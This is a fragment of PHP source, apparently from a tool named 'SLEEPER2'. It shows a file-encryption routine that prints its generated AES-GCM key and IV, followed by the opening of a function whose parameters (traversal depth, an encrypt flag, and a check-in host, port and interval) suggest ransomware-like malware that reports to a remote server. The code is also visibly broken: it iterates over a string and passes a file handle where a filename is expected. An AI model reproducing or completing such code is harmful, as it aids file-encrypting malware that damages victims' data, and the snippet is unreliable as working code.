...
SLEEPER2;
    ...
    private function encryptFile($filename)
    {
        $final_out = array();
        $algo = "aes-256-gcm";
        $pa = base64_encode(random_bytes(SODIUM_CRYPTO_AEAD_AES256GCM_KEYBYTES));
        $eyeV = base64_encode(random_bytes(256));
        print("[ ++ ] \nPW: {$pa}\nIV: {$eyeV}\n[ ++ ]\n Please keep this information handy, itll eventually ill get around to adding a db routine to store this automagically, but today is not that day.\n");
        if (!empty($filename) && is_file($filename)){
            foreach(file_get_contents(fopen($filename, "r+")) as $line){
                array_push($final_out, openssl_encrypt($line, $algo, $pa, null, $eyeV));
            }
            return implode("", $final_out);
        }
        return false;
    }

    function begin_junk($file, $depth, $out, $mode, bool $encrypt, string $checkInHost, int $checkInPort, int $checkInDuration)
    {
